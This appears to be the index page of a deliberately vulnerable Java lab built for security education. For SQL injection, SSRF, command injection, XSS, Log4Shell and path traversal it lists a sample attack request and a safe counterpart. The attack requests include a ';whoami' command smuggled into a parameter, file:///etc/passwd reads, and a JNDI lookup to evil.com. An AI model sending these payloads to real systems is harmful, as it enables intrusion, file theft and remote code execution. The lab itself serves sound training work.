🔓 Mini Java Vulnerability Lab

小型Java安全漏洞靶场 - 仅供安全研究与教育使用

警告：此环境包含真实的安全漏洞代码，仅用于授权的安全测试和教育目的。 请勿在生产环境或未经授权的系统上使用！

SQL Injection

SQL注入漏洞 - 用户输入直接拼接到SQL语句中

VULN 漏洞:
GET /sqli/jdbc/vuln?username=admin' OR '1'='1
SEC 安全:
GET /sqli/jdbc/sec?username=admin

更多: /sqli/like/vuln, /sqli/order/vuln

SSRF

服务端请求伪造 - 可读取内网资源和文件

VULN 漏洞:
GET /ssrf/urlconnection/vuln?url=file:///etc/passwd
SEC 安全:
GET /ssrf/urlconnection/sec?url=http://example.com

更多: /ssrf/httpurl/vuln, /ssrf/httpclient/vuln

Command Injection

命令注入 - 系统命令执行漏洞

VULN 漏洞:
GET /cmd/ping/vuln?host=8.8.8.8;whoami
SEC 安全:
GET /cmd/ping/sec?host=8.8.8.8

更多: /cmd/runtime/vuln, /cmd/processbuilder/vuln

XSS

跨站脚本攻击 - 反射型和存储型XSS

VULN 反射型:
GET /xss/reflect?vuln=<script>alert(1)</script>
VULN 存储型:
GET /xss/stored/store?data=<script>alert(1)</script>

安全: /xss/reflect/sec

Log4Shell CVE-2021-44228

Log4j2 JNDI注入 - 远程代码执行漏洞

VULN 基础:
GET /log4j/vuln?token=${jndi:ldap://evil.com/exp}
VULN Header:
GET /log4j/header -H "User-Agent: ${jndi:ldap://evil.com/exp}"

更多: /log4j/login, /log4j/search, /log4j/bypass

Path Traversal

路径遍历 - 任意文件读取漏洞

VULN 漏洞:
GET /path/traversal/vuln?filename=../../../../../etc/passwd
SEC 安全:
GET /path/traversal/sec?filename=test.txt

更多: /path/image/vuln, /path/absolute/vuln
